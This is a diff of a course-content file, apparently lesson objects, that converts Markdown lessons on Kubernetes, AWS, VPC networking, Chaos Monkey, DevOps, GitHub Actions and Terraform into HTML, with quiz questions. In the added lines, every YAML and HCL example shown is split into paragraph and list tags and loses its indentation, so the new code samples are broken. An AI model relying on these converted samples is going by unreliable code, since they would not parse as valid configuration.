+<li>Base64 encoded (not encrypted by default!)</li>
+<li>Example: passwords, API keys, TLS certificates</li>
+</ul>
 
-**Mental model:** A Deployment creates Pods. A Service gives them a stable address. ConfigMaps and Secrets feed them configuration.`
+<p><strong>Mental model:</strong> A Deployment creates Pods. A Service gives them a stable address. ConfigMaps and Secrets feed them configuration.</p>`
       },
       {
         titleEn: "YAML & kubectl",
-        contentEn: `You describe your desired state in YAML files. K8s makes it happen.
+        contentEn: `<p>You describe your desired state in YAML files. K8s makes it happen.</p>
 
-**Example Deployment:**
-\`\`\`yaml
-apiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: web-app
-spec:
-  replicas: 3
-  selector:
-    matchLabels:
-      app: web
-  template:
-    metadata:
-      labels:
-        app: web
-    spec:
-      containers:
-        - name: web
-          image: myapp:2.0
-          ports:
-            - containerPort: 3000
-          resources:
-            requests:
-              memory: "128Mi"
-              cpu: "250m"
-            limits:
-              memory: "256Mi"
-              cpu: "500m"
-\`\`\`
+<p><strong>Example Deployment:</strong></p>
+<pre><code>yaml
+<p>apiVersion: apps/v1</p>
+<p>kind: Deployment</p>
+<p>metadata:</p>
+<p>name: web-app</p>
+<p>spec:</p>
+<p>replicas: 3</p>
+<p>selector:</p>
+<p>matchLabels:</p>
+<p>app: web</p>
+<p>template:</p>
+<p>metadata:</p>
+<p>labels:</p>
+<p>app: web</p>
+<p>spec:</p>
+<p>containers:</p>
+<ul>
+<li>name: web</li>
+</ul>
+<p>image: myapp:2.0</p>
+<p>ports:</p>
+<ul>
+<li>containerPort: 3000</li>
+</ul>
+<p>resources:</p>
+<p>requests:</p>
+<p>memory: "128Mi"</p>
+<p>cpu: "250m"</p>
+<p>limits:</p>
+<p>memory: "256Mi"</p>
+<p>cpu: "500m"</p>
+</code></pre>
 
-**Essential kubectl commands:**
-- \`kubectl apply -f deploy.yaml\` — create or update resources
-- \`kubectl get pods\` — list all pods
-- \`kubectl describe pod web-app-xyz\` — detailed info about a pod
-- \`kubectl logs web-app-xyz\` — read pod logs
-- \`kubectl exec -it web-app-xyz -- /bin/sh\` — open a shell inside a pod
-- \`kubectl delete -f deploy.yaml\` — remove resources
+<p><strong>Essential kubectl commands:</strong></p>
+<ul>
+<li><code>kubectl apply -f deploy.yaml</code> — create or update resources</li>
+<li><code>kubectl get pods</code> — list all pods</li>
+<li><code>kubectl describe pod web-app-xyz</code> — detailed info about a pod</li>
+<li><code>kubectl logs web-app-xyz</code> — read pod logs</li>
+<li><code>kubectl exec -it web-app-xyz -- /bin/sh</code> — open a shell inside a pod</li>
+<li><code>kubectl delete -f deploy.yaml</code> — remove resources</li>
+</ul>
 
-**Declarative vs Imperative:**
-- Imperative: "Create 3 pods now" (like giving step-by-step orders)
-- Declarative: "I want 3 pods" (K8s figures out how to get there)
-- K8s is declarative. You describe the end state, not the steps.
+<p><strong>Declarative vs Imperative:</strong></p>
+<ul>
+<li>Imperative: "Create 3 pods now" (like giving step-by-step orders)</li>
+<li>Declarative: "I want 3 pods" (K8s figures out how to get there)</li>
+<li>K8s is declarative. You describe the end state, not the steps.</li>
+</ul>
 
 {question}
-A Deployment has replicas: 3 and one pod crashes. What happens?
-a) The app goes down until you manually fix it
-b) K8s automatically creates a new pod to replace it
-c) K8s shuts down the other 2 pods
-d) Nothing, you need to run kubectl restart
+<p>A Deployment has replicas: 3 and one pod crashes. What happens?</p>
+<p>a) The app goes down until you manually fix it</p>
+<p>b) K8s automatically creates a new pod to replace it</p>
+<p>c) K8s shuts down the other 2 pods</p>
+<p>d) Nothing, you need to run kubectl restart</p>
 
-answer: b
-explanation: The Deployment controller always works to match the desired state (3 replicas). If a pod dies, it creates a new one.`
+<p>answer: b</p>
+<p>explanation: The Deployment controller always works to match the desired state (3 replicas). If a pod dies, it creates a new one.</p>`
       },
       {
         titleEn: "Horizontal Pod Autoscaler (HPA)",
-        contentEn: `HPA automatically adjusts the number of pods based on load.
+        contentEn: `<p>HPA automatically adjusts the number of pods based on load.</p>
 
-**How it works:**
-1. You define: "keep CPU usage around 50%"
-2. HPA checks metrics every 15 seconds
-3. If average CPU > 50% → add more pods
-4. If average CPU < 50% → remove extra pods
+<p><strong>How it works:</strong></p>
+<ol>
+<li>You define: "keep CPU usage around 50%"</li>
+<li>HPA checks metrics every 15 seconds</li>
+<li>If average CPU > 50% → add more pods</li>
+<li>If average CPU < 50% → remove extra pods</li>
+</ol>
 
-**Example:**
-\`\`\`yaml
-apiVersion: autoscaling/v2
-kind: HorizontalPodAutoscaler
-metadata:
-  name: web-hpa
-spec:
-  scaleTargetRef:
-    apiVersion: apps/v1
-    kind: Deployment
-    name: web-app
-  minReplicas: 2
-  maxReplicas: 10
-  metrics:
-    - type: Resource
-      resource:
-        name: cpu
-        target:
-          type: Utilization
-          averageUtilization: 50
-\`\`\`
+<p><strong>Example:</strong></p>
+<pre><code>yaml
+<p>apiVersion: autoscaling/v2</p>
+<p>kind: HorizontalPodAutoscaler</p>
+<p>metadata:</p>
+<p>name: web-hpa</p>
+<p>spec:</p>
+<p>scaleTargetRef:</p>
+<p>apiVersion: apps/v1</p>
+<p>kind: Deployment</p>
+<p>name: web-app</p>
+<p>minReplicas: 2</p>
+<p>maxReplicas: 10</p>
+<p>metrics:</p>
+<ul>
+<li>type: Resource</li>
+</ul>
+<p>resource:</p>
+<p>name: cpu</p>
+<p>target:</p>
+<p>type: Utilization</p>
+<p>averageUtilization: 50</p>
+</code></pre>
 
-**Key settings:**
-- **minReplicas: 2** — never go below 2 (high availability)
-- **maxReplicas: 10** — never go above 10 (cost control)
-- **averageUtilization: 50** — target 50% CPU usage
+<p><strong>Key settings:</strong></p>
+<ul>
+<li><strong>minReplicas: 2</strong> — never go below 2 (high availability)</li>
+<li><strong>maxReplicas: 10</strong> — never go above 10 (cost control)</li>
+<li><strong>averageUtilization: 50</strong> — target 50% CPU usage</li>
+</ul>
 
-**Scale-up vs scale-down:**
-- Scale-up is fast (seconds) — respond to traffic spikes quickly
-- Scale-down is slow (5 minutes default) — avoid flapping
+<p><strong>Scale-up vs scale-down:</strong></p>
+<ul>
+<li>Scale-up is fast (seconds) — respond to traffic spikes quickly</li>
+<li>Scale-down is slow (5 minutes default) — avoid flapping</li>
+</ul>
 
-**Real example:**
-Normal load → 2 pods at 30% CPU.
-Black Friday sale → CPU jumps to 80%.
-HPA scales to 5 pods → CPU drops to 32%.
-Sale ends → HPA slowly scales back to 2 pods.
+<p><strong>Real example:</strong></p>
+<p>Normal load → 2 pods at 30% CPU.</p>
+<p>Black Friday sale → CPU jumps to 80%.</p>
+<p>HPA scales to 5 pods → CPU drops to 32%.</p>
+<p>Sale ends → HPA slowly scales back to 2 pods.</p>
 
-This is why cloud-native apps can handle traffic spikes without human intervention.`
+<p>This is why cloud-native apps can handle traffic spikes without human intervention.</p>`
       },
       {
         titleEn: "K8s Networking",
-        contentEn: `Kubernetes networking has three layers: pod-to-pod, services, and external access.
+        contentEn: `<p>Kubernetes networking has three layers: pod-to-pod, services, and external access.</p>
 
-**CNI (Container Network Interface):**
-- A plugin that gives each pod its own IP address
-- Popular choices: Calico, Flannel, Cilium
-- Rule: every pod can talk to every other pod (by default)
+<p><strong>CNI (Container Network Interface):</strong></p>
+<ul>
+<li>A plugin that gives each pod its own IP address</li>
+<li>Popular choices: Calico, Flannel, Cilium</li>
+<li>Rule: every pod can talk to every other pod (by default)</li>
+</ul>
 
-**CoreDNS:**
-- The internal DNS server of K8s
-- Lets pods find services by name
-- \`my-service.my-namespace.svc.cluster.local\` → the service IP
-- Short form works too: just \`my-service\` within the same namespace
+<p><strong>CoreDNS:</strong></p>
+<ul>
+<li>The internal DNS server of K8s</li>
+<li>Lets pods find services by name</li>
+<li><code>my-service.my-namespace.svc.cluster.local</code> → the service IP</li>
+<li>Short form works too: just <code>my-service</code> within the same namespace</li>
+</ul>
 
-**Service types:**
-- **ClusterIP** — internal only (default). Other pods can reach it.
-- **NodePort** — opens a port (30000-32767) on every node
-- **LoadBalancer** — creates a cloud load balancer (AWS ALB, GCP LB)
+<p><strong>Service types:</strong></p>
+<ul>
+<li><strong>ClusterIP</strong> — internal only (default). Other pods can reach it.</li>
+<li><strong>NodePort</strong> — opens a port (30000-32767) on every node</li>
+<li><strong>LoadBalancer</strong> — creates a cloud load balancer (AWS ALB, GCP LB)</li>
+</ul>
 
-**Ingress:**
-- Routes external HTTP traffic to internal services
-- Acts like a smart reverse proxy
-- Can route by path: /api → api-service, /web → web-service
-- Can route by domain: api.myapp.com → api-service
-- Handles TLS/SSL termination
+<p><strong>Ingress:</strong></p>
+<ul>
+<li>Routes external HTTP traffic to internal services</li>
+<li>Acts like a smart reverse proxy</li>
+<li>Can route by path: /api → api-service, /web → web-service</li>
+<li>Can route by domain: api.myapp.com → api-service</li>
+<li>Handles TLS/SSL termination</li>
+</ul>
 
-\`\`\`yaml
-apiVersion: networking.k8s.io/v1
-kind: Ingress
-metadata:
-  name: my-ingress
-spec:
-  rules:
-    - host: myapp.com
-      http:
-        paths:
-          - path: /api
-            pathType: Prefix
-            backend:
-              service:
-                name: api-service
-                port:
-                  number: 8080
-\`\`\`
+<pre><code>yaml
+<p>apiVersion: networking.k8s.io/v1</p>
+<p>kind: Ingress</p>
+<p>metadata:</p>
+<p>name: my-ingress</p>
+<p>spec:</p>
+<p>rules:</p>
+<ul>
+<li>host: myapp.com</li>
+</ul>
+<p>http:</p>
+<p>paths:</p>
+<ul>
+<li>path: /api</li>
+</ul>
+<p>pathType: Prefix</p>
+<p>backend:</p>
+<p>service:</p>
+<p>name: api-service</p>
+<p>port:</p>
+<p>number: 8080</p>
+</code></pre>
 
 {simulation}
-Trace a user request through K8s networking:
-1. User types myapp.com/api/users in browser
-2. DNS resolves myapp.com to the cloud load balancer IP
-3. Load balancer sends traffic to a K8s node
-4. Ingress controller sees /api and routes to api-service
-5. api-service (ClusterIP) picks one of 3 healthy pods
-6. The pod processes the request and returns a response
-7. The response travels back the same path`
+<p>Trace a user request through K8s networking:</p>
+<ol>
+<li>User types myapp.com/api/users in browser</li>
+<li>DNS resolves myapp.com to the cloud load balancer IP</li>
+<li>Load balancer sends traffic to a K8s node</li>
+<li>Ingress controller sees /api and routes to api-service</li>
+<li>api-service (ClusterIP) picks one of 3 healthy pods</li>
+<li>The pod processes the request and returns a response</li>
+<li>The response travels back the same path</li>
+</ol>`
       }
     ]
   },
@@ -5936,157 +6362,194 @@ Trace a user request through K8s networking:
     pages: [
       {
         titleEn: "Service Models: IaaS, PaaS, SaaS",
-        contentEn: `Cloud computing means renting computers over the internet instead of buying them.
+        contentEn: `<p>Cloud computing means renting computers over the internet instead of buying them.</p>
 
-**Three service models:**
+<p><strong>Three service models:</strong></p>
 
-**IaaS (Infrastructure as a Service):**
-- You rent raw servers, storage, and networks
-- You manage: OS, runtime, app, data
-- The cloud manages: physical hardware, power, cooling
-- Example: AWS EC2, Google Compute Engine, Azure VMs
-- Analogy: renting an empty apartment — you bring your own furniture
+<p><strong>IaaS (Infrastructure as a Service):</strong></p>
+<ul>
+<li>You rent raw servers, storage, and networks</li>
+<li>You manage: OS, runtime, app, data</li>
+<li>The cloud manages: physical hardware, power, cooling</li>
+<li>Example: AWS EC2, Google Compute Engine, Azure VMs</li>
+<li>Analogy: renting an empty apartment — you bring your own furniture</li>
+</ul>
 
-**PaaS (Platform as a Service):**
-- You just deploy your code
-- The cloud manages: OS, runtime, scaling, updates
-- You manage: your app and its data
-- Example: Heroku, AWS Elastic Beanstalk, Google App Engine
-- Analogy: a hotel room — furniture included, just bring your clothes
+<p><strong>PaaS (Platform as a Service):</strong></p>
+<ul>
+<li>You just deploy your code</li>
+<li>The cloud manages: OS, runtime, scaling, updates</li>
+<li>You manage: your app and its data</li>
+<li>Example: Heroku, AWS Elastic Beanstalk, Google App Engine</li>
+<li>Analogy: a hotel room — furniture included, just bring your clothes</li>
+</ul>
 
-**SaaS (Software as a Service):**
-- You use a finished product
-- The cloud manages everything
-- Example: Gmail, Slack, Salesforce
-- Analogy: going to a restaurant — just eat, no cooking
+<p><strong>SaaS (Software as a Service):</strong></p>
+<ul>
+<li>You use a finished product</li>
+<li>The cloud manages everything</li>
+<li>Example: Gmail, Slack, Salesforce</li>
+<li>Analogy: going to a restaurant — just eat, no cooking</li>
+</ul>
 
-| You manage | IaaS | PaaS | SaaS |
-|---|---|---|---|
-| Application | Yes | Yes | No |
-| Runtime | Yes | No | No |
-| OS | Yes | No | No |
-| Hardware | No | No | No |
+<table>
+<thead><tr><th>You manage</th><th>IaaS</th><th>PaaS</th><th>SaaS</th></tr></thead>
+<tbody>
+<tr><td>Application</td><td>Yes</td><td>Yes</td><td>No</td></tr>
+<tr><td>Runtime</td><td>Yes</td><td>No</td><td>No</td></tr>
+<tr><td>OS</td><td>Yes</td><td>No</td><td>No</td></tr>
+<tr><td>Hardware</td><td>No</td><td>No</td><td>No</td></tr>
+</tbody></table>
 
-**How to choose:**
-- Need full control? → IaaS
-- Want to focus on code? → PaaS
-- Just need to use software? → SaaS`
+<p><strong>How to choose:</strong></p>
+<ul>
+<li>Need full control? → IaaS</li>
+<li>Want to focus on code? → PaaS</li>
+<li>Just need to use software? → SaaS</li>
+</ul>`
       },
       {
         titleEn: "AWS Core Services",
-        contentEn: `AWS is the largest cloud provider. These are the services you must know.
+        contentEn: `<p>AWS is the largest cloud provider. These are the services you must know.</p>
 
-**Compute:**
-- **EC2** — virtual servers (IaaS). Choose CPU, RAM, disk. You manage the OS.
-- **Lambda** — serverless functions. Upload code, pay per execution. No servers to manage.
+<p><strong>Compute:</strong></p>
+<ul>
+<li><strong>EC2</strong> — virtual servers (IaaS). Choose CPU, RAM, disk. You manage the OS.</li>
+<li><strong>Lambda</strong> — serverless functions. Upload code, pay per execution. No servers to manage.</li>
+</ul>
 
-**Storage:**
-- **S3** — object storage. Store files, images, backups. Very cheap, very durable (99.999999999% — "eleven nines").
-- **EBS** — block storage. Like a virtual hard disk attached to an EC2 instance.
+<p><strong>Storage:</strong></p>
+<ul>
+<li><strong>S3</strong> — object storage. Store files, images, backups. Very cheap, very durable (99.999999999% — "eleven nines").</li>
+<li><strong>EBS</strong> — block storage. Like a virtual hard disk attached to an EC2 instance.</li>
+</ul>
 
-**Database:**
-- **RDS** — managed relational databases (PostgreSQL, MySQL). AWS handles backups, patches, failover.
-- **DynamoDB** — managed NoSQL. Very fast, scales automatically.
+<p><strong>Database:</strong></p>
+<ul>
+<li><strong>RDS</strong> — managed relational databases (PostgreSQL, MySQL). AWS handles backups, patches, failover.</li>
+<li><strong>DynamoDB</strong> — managed NoSQL. Very fast, scales automatically.</li>
+</ul>
 
-**Networking:**
-- **VPC** — your private network in the cloud
-- **Route 53** — DNS service
-- **CloudFront** — CDN (content delivery network)
+<p><strong>Networking:</strong></p>
+<ul>
+<li><strong>VPC</strong> — your private network in the cloud</li>
+<li><strong>Route 53</strong> — DNS service</li>
+<li><strong>CloudFront</strong> — CDN (content delivery network)</li>
+</ul>
 
-**The serverless shift:**
-Traditional: EC2 + RDS + load balancer (you manage scaling)
-Serverless: Lambda + DynamoDB + API Gateway (AWS manages scaling)
+<p><strong>The serverless shift:</strong></p>
+<p>Traditional: EC2 + RDS + load balancer (you manage scaling)</p>
+<p>Serverless: Lambda + DynamoDB + API Gateway (AWS manages scaling)</p>
 
 {question}
-Your app gets 100 requests per day. Which is cheaper?
-a) A t3.medium EC2 running 24/7 ($30/month)
-b) Lambda functions ($0.0000002 per request)
-c) Both cost the same
+<p>Your app gets 100 requests per day. Which is cheaper?</p>
+<p>a) A t3.medium EC2 running 24/7 ($30/month)</p>
+<p>b) Lambda functions ($0.0000002 per request)</p>
+<p>c) Both cost the same</p>
 
-answer: b
-explanation: 100 requests/day = 3,000/month. At $0.0000002 per request, that is $0.0006/month. The EC2 instance costs $30/month even when idle. Lambda wins for low-traffic apps.`
+<p>answer: b</p>
+<p>explanation: 100 requests/day = 3,000/month. At $0.0000002 per request, that is $0.0006/month. The EC2 instance costs $30/month even when idle. Lambda wins for low-traffic apps.</p>`
       },
       {
         titleEn: "VPC Networking",
-        contentEn: `A VPC (Virtual Private Cloud) is your own private network inside AWS.
+        contentEn: `<p>A VPC (Virtual Private Cloud) is your own private network inside AWS.</p>
 
-**Key components:**
-- **Subnets** — slices of your network
-  - Public subnet: has a route to the internet (for web servers)
-  - Private subnet: no direct internet access (for databases)
-- **Internet Gateway** — the door to the internet
-- **NAT Gateway** — lets private resources reach the internet (for updates) without being reachable from the internet
-- **Security Groups** — firewall rules per resource (allow port 443 from anywhere, allow port 5432 only from the web server)
-- **Route Tables** — traffic rules (this subnet goes to the internet gateway, that subnet goes to the NAT)
+<p><strong>Key components:</strong></p>
+<ul>
+<li><strong>Subnets</strong> — slices of your network</li>
+<li>Public subnet: has a route to the internet (for web servers)</li>
+<li>Private subnet: no direct internet access (for databases)</li>
+<li><strong>Internet Gateway</strong> — the door to the internet</li>
+<li><strong>NAT Gateway</strong> — lets private resources reach the internet (for updates) without being reachable from the internet</li>
+<li><strong>Security Groups</strong> — firewall rules per resource (allow port 443 from anywhere, allow port 5432 only from the web server)</li>
+<li><strong>Route Tables</strong> — traffic rules (this subnet goes to the internet gateway, that subnet goes to the NAT)</li>
+</ul>
 
-**Typical architecture:**
-\`\`\`
-Internet
-   |
-Internet Gateway
-   |
-[Public Subnet]
-  - Load Balancer
-  - NAT Gateway
-   |
-[Private Subnet]
-  - Web servers (EC2)
-  - API servers
-   |
-[Private Subnet]
-  - Database (RDS)
-  - Cache (ElastiCache)
-\`\`\`
+<p><strong>Typical architecture:</strong></p>
+<pre><code>Internet
+<p>|</p>
+<p>Internet Gateway</p>
+<p>|</p>
+<p>[Public Subnet]</p>
+<ul>
+<li>Load Balancer</li>
+<li>NAT Gateway</li>
+</ul>
+<p>|</p>
+<p>[Private Subnet]</p>
+<ul>
+<li>Web servers (EC2)</li>
+<li>API servers</li>
+</ul>
+<p>|</p>
+<p>[Private Subnet]</p>
+<ul>
+<li>Database (RDS)</li>
+<li>Cache (ElastiCache)</li>
+</ul>
+</code></pre>
 
-**Security layers:**
-1. Security Groups (instance level) — stateful firewall
-2. Network ACLs (subnet level) — stateless firewall
-3. Private subnets (network level) — no public IP at all
+<p><strong>Security layers:</strong></p>
+<ol>
+<li>Security Groups (instance level) — stateful firewall</li>
+<li>Network ACLs (subnet level) — stateless firewall</li>
+<li>Private subnets (network level) — no public IP at all</li>
+</ol>
 
-**Rule of thumb:** Put only load balancers in public subnets. Everything else goes in private subnets.`
+<p><strong>Rule of thumb:</strong> Put only load balancers in public subnets. Everything else goes in private subnets.</p>`
       },
       {
         titleEn: "High Availability & Chaos Engineering",
-        contentEn: `Cloud does not mean "never fails." It means "designed to survive failures."
+        contentEn: `<p>Cloud does not mean "never fails." It means "designed to survive failures."</p>
 
-**Multi-AZ (Availability Zones):**
-- Each AWS region has 2-6 AZs
-- An AZ is a separate data center (own power, cooling, network)
-- Deploy your app across 2+ AZs
-- If one AZ goes down, the others keep running
+<p><strong>Multi-AZ (Availability Zones):</strong></p>
+<ul>
+<li>Each AWS region has 2-6 AZs</li>
+<li>An AZ is a separate data center (own power, cooling, network)</li>
+<li>Deploy your app across 2+ AZs</li>
+<li>If one AZ goes down, the others keep running</li>
+</ul>
 
-**Design rules:**
-- Stateless servers (no data stored on the server itself)
-- Database replication across AZs (RDS Multi-AZ)
-- Load balancer distributes traffic to healthy instances
-- Auto Scaling Group replaces failed instances
+<p><strong>Design rules:</strong></p>
+<ul>
+<li>Stateless servers (no data stored on the server itself)</li>
+<li>Database replication across AZs (RDS Multi-AZ)</li>
+<li>Load balancer distributes traffic to healthy instances</li>
+<li>Auto Scaling Group replaces failed instances</li>
+</ul>
 
-**The Netflix Chaos Monkey story:**
-In 2011, Netflix moved to AWS. They asked: "What if servers randomly die?"
-Instead of hoping it would not happen, they built Chaos Monkey — a tool that randomly kills production servers during business hours.
+<p><strong>The Netflix Chaos Monkey story:</strong></p>
+<p>In 2011, Netflix moved to AWS. They asked: "What if servers randomly die?"</p>
+<p>Instead of hoping it would not happen, they built Chaos Monkey — a tool that randomly kills production servers during business hours.</p>
 
-Why? Because:
-- If your system survives random server deaths, it can survive real outages
-- Engineers are forced to build resilient systems
-- Problems are found on Tuesday at 2 PM (when everyone is awake), not Saturday at 3 AM
+<p>Why? Because:</p>
+<ul>
+<li>If your system survives random server deaths, it can survive real outages</li>
+<li>Engineers are forced to build resilient systems</li>
+<li>Problems are found on Tuesday at 2 PM (when everyone is awake), not Saturday at 3 AM</li>
+</ul>
 
-**Chaos Monkey rules:**
-- Only runs during business hours
-- Only kills one instance at a time
-- The team gets alerts and can see what happened
+<p><strong>Chaos Monkey rules:</strong></p>
+<ul>
+<li>Only runs during business hours</li>
+<li>Only kills one instance at a time</li>
+<li>The team gets alerts and can see what happened</li>
+</ul>
 
-**The result:** When AWS had a major outage in 2012, Netflix stayed up while other companies went down. Their systems were trained to survive failure.
+<p><strong>The result:</strong> When AWS had a major outage in 2012, Netflix stayed up while other companies went down. Their systems were trained to survive failure.</p>
 
 {thinkOutside}
-Your company runs a web app on 2 EC2 instances in one AZ. The CEO says "we never had downtime, why pay for Multi-AZ?"
+<p>Your company runs a web app on 2 EC2 instances in one AZ. The CEO says "we never had downtime, why pay for Multi-AZ?"</p>
 
-What is wrong with this thinking? What would you say to the CEO?
+<p>What is wrong with this thinking? What would you say to the CEO?</p>
 
-Key points:
-- "We never had downtime" = we were lucky, not resilient
-- A single AZ failure takes down everything
-- The cost of Multi-AZ is small compared to the cost of hours of downtime
-- Netflix did not wait for failure — they practiced for it`
+<p>Key points:</p>
+<ul>
+<li>"We never had downtime" = we were lucky, not resilient</li>
+<li>A single AZ failure takes down everything</li>
+<li>The cost of Multi-AZ is small compared to the cost of hours of downtime</li>
+<li>Netflix did not wait for failure — they practiced for it</li>
+</ul>`
       }
     ]
   },
@@ -6096,202 +6559,244 @@ Key points:
     pages: [
       {
         titleEn: "What is DevOps?",
-        contentEn: `DevOps is a culture change, not just a set of tools.
+        contentEn: `<p>DevOps is a culture change, not just a set of tools.</p>
 
-**The old way (before DevOps):**
-- Developers write code and throw it "over the wall" to Operations
-- Operations deploy it and deal with problems
-- Blame game: "It works on my machine!" vs "Your code crashed the server!"
-- Releases happen every few months. Each release is scary.
+<p><strong>The old way (before DevOps):</strong></p>
+<ul>
+<li>Developers write code and throw it "over the wall" to Operations</li>
+<li>Operations deploy it and deal with problems</li>
+<li>Blame game: "It works on my machine!" vs "Your code crashed the server!"</li>
+<li>Releases happen every few months. Each release is scary.</li>
+</ul>
 
-**The DevOps way:**
-- Dev and Ops work together as one team
-- "You build it, you run it" — developers are responsible for their code in production
-- Releases happen many times per day. Each release is small and safe.
-- Automation replaces manual work
+<p><strong>The DevOps way:</strong></p>
+<ul>
+<li>Dev and Ops work together as one team</li>
+<li>"You build it, you run it" — developers are responsible for their code in production</li>
+<li>Releases happen many times per day. Each release is small and safe.</li>
+<li>Automation replaces manual work</li>
+</ul>
 
-**The CALMS framework:**
-- **C**ulture — collaboration, shared responsibility, no blame
-- **A**utomation — CI/CD, Infrastructure as Code, monitoring
-- **L**ean — small batches, fast feedback, reduce waste
-- **M**easurement — measure everything (deploy frequency, failure rate, recovery time)
-- **S**haring — share knowledge, tools, and on-call duties
+<p><strong>The CALMS framework:</strong></p>
+<ul>
+<li><strong>C</strong>ulture — collaboration, shared responsibility, no blame</li>
+<li><strong>A</strong>utomation — CI/CD, Infrastructure as Code, monitoring</li>
+<li><strong>L</strong>ean — small batches, fast feedback, reduce waste</li>
+<li><strong>M</strong>easurement — measure everything (deploy frequency, failure rate, recovery time)</li>
+<li><strong>S</strong>haring — share knowledge, tools, and on-call duties</li>
+</ul>
 
-**Key metrics (DORA):**
-- Deployment frequency → how often you release
-- Lead time for changes → from commit to production
-- Change failure rate → % of releases that cause problems
-- Mean time to recovery (MTTR) → how fast you fix problems
+<p><strong>Key metrics (DORA):</strong></p>
+<ul>
+<li>Deployment frequency → how often you release</li>
+<li>Lead time for changes → from commit to production</li>
+<li>Change failure rate → % of releases that cause problems</li>
+<li>Mean time to recovery (MTTR) → how fast you fix problems</li>
+</ul>
 
-**Elite teams:** deploy multiple times per day, lead time < 1 hour, failure rate < 5%, recovery < 1 hour.`
+<p><strong>Elite teams:</strong> deploy multiple times per day, lead time < 1 hour, failure rate < 5%, recovery < 1 hour.</p>`
       },
       {
         titleEn: "CI/CD with GitHub Actions",
-        contentEn: `CI/CD automates the path from code to production.
+        contentEn: `<p>CI/CD automates the path from code to production.</p>
 
-**CI (Continuous Integration):**
-- Every push triggers automatic tests
-- Catch bugs in minutes, not days
-- Merge small changes often (not big merges once a month)
+<p><strong>CI (Continuous Integration):</strong></p>
+<ul>
+<li>Every push triggers automatic tests</li>
+<li>Catch bugs in minutes, not days</li>
+<li>Merge small changes often (not big merges once a month)</li>
+</ul>
 
-**CD (Continuous Delivery / Deployment):**
-- Delivery: code is always ready to deploy (one-click)
-- Deployment: code is automatically deployed after tests pass
+<p><strong>CD (Continuous Delivery / Deployment):</strong></p>
+<ul>
+<li>Delivery: code is always ready to deploy (one-click)</li>
+<li>Deployment: code is automatically deployed after tests pass</li>
+</ul>
 
-**GitHub Actions example:**
-\`\`\`yaml
-# .github/workflows/ci.yml
-name: CI Pipeline
+<p><strong>GitHub Actions example:</strong></p>
+<pre><code>yaml
+<p># .github/workflows/ci.yml</p>
+<p>name: CI Pipeline</p>
 
-on:
-  push:
-    branches: [main]
-  pull_request:
-    branches: [main]
+<p>on:</p>
+<p>push:</p>
+<p>branches: [main]</p>
+<p>pull_request:</p>
+<p>branches: [main]</p>
 
-jobs:
-  test:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-      - uses: actions/setup-node@v4
-        with:
-          node-version: 20
-      - run: npm install
-      - run: npm test
-      - run: npm run lint
+<p>jobs:</p>
+<p>test:</p>
+<p>runs-on: ubuntu-latest</p>
+<p>steps:</p>
+<ul>
+<li>uses: actions/checkout@v4</li>
+<li>uses: actions/setup-node@v4</li>
+</ul>
+<p>with:</p>
+<p>node-version: 20</p>
+<ul>
+<li>run: npm install</li>
+<li>run: npm test</li>
+<li>run: npm run lint</li>
+</ul>
 
-  deploy:
-    needs: test
-    if: github.ref == 'refs/heads/main'
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-      - run: docker build -t myapp .
-      - run: docker push myapp:latest
-      - run: kubectl apply -f k8s/
-\`\`\`
+<p>deploy:</p>
+<p>needs: test</p>
+<p>if: github.ref == 'refs/heads/main'</p>
+<p>runs-on: ubuntu-latest</p>
+<p>steps:</p>
+<ul>
+<li>uses: actions/checkout@v4</li>
+<li>run: docker build -t myapp .</li>
+<li>run: docker push myapp:latest</li>
+<li>run: kubectl apply -f k8s/</li>
+</ul>
+</code></pre>
 
-**Key ideas:**
-- **on: push** — triggers on every push
-- **needs: test** — deploy only runs after tests pass
-- **if: github.ref == 'refs/heads/main'** — only deploy from main branch
-- Pull requests run tests but do not deploy
+<p><strong>Key ideas:</strong></p>
+<ul>
+<li><strong>on: push</strong> — triggers on every push</li>
+<li><strong>needs: test</strong> — deploy only runs after tests pass</li>
+<li><strong>if: github.ref == 'refs/heads/main'</strong> — only deploy from main branch</li>
+<li>Pull requests run tests but do not deploy</li>
+</ul>
 
 {question}
-A developer pushes code. Tests pass but the deploy step fails. What happens?
-a) The broken code goes to production
-b) The code stays in the branch, production is not affected
-c) GitHub reverts the commit automatically
-d) All previous deployments are rolled back
+<p>A developer pushes code. Tests pass but the deploy step fails. What happens?</p>
+<p>a) The broken code goes to production</p>
+<p>b) The code stays in the branch, production is not affected</p>
+<p>c) GitHub reverts the commit automatically</p>
+<p>d) All previous deployments are rolled back</p>
 
-answer: b
-explanation: The deploy step failed, so the new code never reached production. The old version keeps running. This is the safety net of CI/CD.`
+<p>answer: b</p>
+<p>explanation: The deploy step failed, so the new code never reached production. The old version keeps running. This is the safety net of CI/CD.</p>`
       },
       {
         titleEn: "Terraform: Infrastructure as Code",
-        contentEn: `Terraform lets you define infrastructure in code files instead of clicking in a web console.
+        contentEn: `<p>Terraform lets you define infrastructure in code files instead of clicking in a web console.</p>
 
-**Why IaC?**
-- Reproducible: run the same code → get the same infrastructure
-- Version controlled: git log shows who changed what and when
-- Reviewable: infrastructure changes go through pull requests
-- Fast: create 50 servers in seconds, not hours of clicking
+<p><strong>Why IaC?</strong></p>
+<ul>
+<li>Reproducible: run the same code → get the same infrastructure</li>
+<li>Version controlled: git log shows who changed what and when</li>
+<li>Reviewable: infrastructure changes go through pull requests</li>
+<li>Fast: create 50 servers in seconds, not hours of clicking</li>
+</ul>
 
-**Terraform basics:**
-\`\`\`hcl
-# main.tf
-provider "aws" {
-  region = "us-east-1"
-}
+<p><strong>Terraform basics:</strong></p>
+<pre><code>hcl
+<p># main.tf</p>
+<p>provider "aws" {</p>
+<p>region = "us-east-1"</p>
+<p>}</p>
 
-resource "aws_instance" "web" {
-  ami           = "ami-0c55b159cbfafe1f0"
-  instance_type = "t3.micro"
+<p>resource "aws_instance" "web" {</p>
+<p>ami           = "ami-0c55b159cbfafe1f0"</p>
+<p>instance_type = "t3.micro"</p>
 
-  tags = {
-    Name = "web-server"
-  }
-}
+<p>tags = {</p>
+<p>Name = "web-server"</p>
+<p>}</p>
+<p>}</p>
 
-resource "aws_s3_bucket" "data" {
-  bucket = "my-app-data-bucket"
-}
-\`\`\`
+<p>resource "aws_s3_bucket" "data" {</p>
+<p>bucket = "my-app-data-bucket"</p>
+<p>}</p>
+</code></pre>
 
-**Terraform workflow:**
-1. \`terraform init\` — download provider plugins
-2. \`terraform plan\` — show what will change (add, modify, destroy)
